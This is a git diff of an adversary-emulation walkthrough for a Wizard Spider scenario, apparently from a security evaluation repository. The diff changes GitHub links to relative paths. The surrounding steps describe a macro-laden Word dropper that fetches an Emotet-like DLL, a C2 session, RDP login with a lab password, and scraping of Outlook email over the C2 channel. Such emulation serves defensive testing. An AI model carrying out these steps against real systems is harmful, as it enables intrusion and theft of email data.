@@ -10,7 +10,7 @@ This scenario emulates Wizard Spider TTPs based on  several malware specimens ei
 
 The steps in this scenario are grouped to support Protections Evaluations.
 
-![Wizard Spider Protections Diagram](/Resources/images/Wizard%20Spider%20Protections%20Diagram.drawio-2.png)
+![Wizard Spider Protections Diagram](../../Resources/images/Wizard%20Spider%20Protections%20Diagram.drawio-2.png)
 
 
 ---
@@ -23,9 +23,9 @@ The steps in this scenario are grouped to support Protections Evaluations.
 
 Step1 emulates Wizard Spider gaining initial access using a Microsoft Word document.
 
-The word document contains [obfuscated VBA macros](https://github.com/attackevals/wizard_spider/tree/main/Resources/Emotet_Dropper) that downloads and executes a malicious DLL.
+The word document contains [obfuscated VBA macros](../../Resources/Emotet_Dropper) that downloads and executes a malicious DLL.
 
-The [malicious DLL](https://github.com/attackevals/wizard_spider/tree/main/Resources/Emotet) establishes a C2 session with the adversary control server.
+The [malicious DLL](../../Resources/Emotet) establishes a C2 session with the adversary control server.
 
 The malicious DLL is based on Emotet.
 
@@ -81,9 +81,9 @@ xfreerdp +clipboard /u:oz\\judy /p:"Passw0rd!" /v:10.0.0.7
 ```bash
 # Emotet has sent Microsoft Word documents with embedded macros that will invoke scripts to download additional payloads. [6][13][2][8][12]
 ```
-[Source Code - Dropper Word Document](https://github.com/attackevals/wizard_spider/tree/main/Resources/Emotet_Dropper)
+[Source Code - Dropper Word Document](../../Resources/Emotet_Dropper)
 
-[Source Code - Emotet DLL](https://github.com/attackevals/wizard_spider/tree/main/Resources/Emotet)
+[Source Code - Emotet DLL](../../Resources/Emotet)
 
 
 <br>
@@ -145,7 +145,7 @@ Copy/paste the command in your lower terminal tab:
 
 ./evalsC2client.py --set-task DOROTHY_DABB41A5 1
 ```
-[Source Code](https://github.com/attackevals/wizard_spider/blob/main/Resources/Emotet/EmotetClientDLL/EmotetClientDLL/persistence.cpp#L21)
+[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/persistence.cpp#L21)
 
 ### :microscope: Cited Intelligence
 * https://www.cynet.com/attack-techniques-hands-on/emotet-vs-trump-deep-dive-analysis-of-a-killer-info-stealer/
@@ -191,7 +191,7 @@ Enumerate processes.
 
 ./evalsC2client.py --set-task DOROTHY_DABB41A5 2
 ```
-[Source Code](https://github.com/attackevals/wizard_spider/blob/main/Resources/Emotet/EmotetClientDLL/EmotetClientDLL/hostdiscovery.cpp#L172)
+[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/hostdiscovery.cpp#L172)
 
 
 Download Outlook Scraper DLL from C2 channel (192.168.0.4:80 / HTTP) to current working directory.
@@ -199,14 +199,14 @@ Download Outlook Scraper DLL from C2 channel (192.168.0.4:80 / HTTP) to current 
 ```bash
 ./evalsC2client.py --set-task DOROTHY_DABB41A5 3
 ```
-[Source Code](https://github.com/attackevals/wizard_spider/blob/f46aab5932abfd05db068d1eb81d14fdd15dc3e4/Resources/Emotet/EmotetClientDLL/EmotetClientDLL/comms.cpp#L114)
+[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/comms.cpp#L114)
 
 Load Outlook Scraper DLL into emotet's address space via call to LoadLibraryW() and GetProcAddress().
 
 ```bash
 ./evalsC2client.py --set-task DOROTHY_DABB41A5 4
 ```
-[Source Code](https://github.com/attackevals/wizard_spider/blob/main/Resources/Emotet/EmotetClientDLL/EmotetClientDLL/loadoutlookscraper.cpp#L16)
+[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/loadoutlookscraper.cpp#L16)
 
 Scrape email content from Outlook inbox via _popen call to PowerShell.
 
@@ -217,7 +217,7 @@ Scrape email content from Outlook inbox via _popen call to PowerShell.
 
 ./evalsC2client.py --set-task DOROTHY_DABB41A5 5
 ```
-[Source Code](https://github.com/attackevals/wizard_spider/blob/main/Resources/Emotet/OutlookScraper/OutlookScraper/outlook.cpp#L64)
+[Source Code](../../Resources/Emotet/OutlookScraper/OutlookScraper/outlook.cpp#L64)
 
 [_popen info, because I've never heard of it either](https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=msvc-160)
 
@@ -229,7 +229,7 @@ Scrape email addresses from inbox.
 
 ./evalsC2client.py --set-task DOROTHY_DABB41A5 8
 ```
-[Source Code](https://github.com/attackevals/wizard_spider/blob/main/Resources/Emotet/EmotetClientDLL/EmotetClientDLL/comms.cpp#L99)
+[Source Code](../../Resources/Emotet/EmotetClientDLL/EmotetClientDLL/comms.cpp#L99)
 
 :warning: Sign out of RDP session: `Right-click Windows icon -> Shut down or sign out -> Sign out`
 
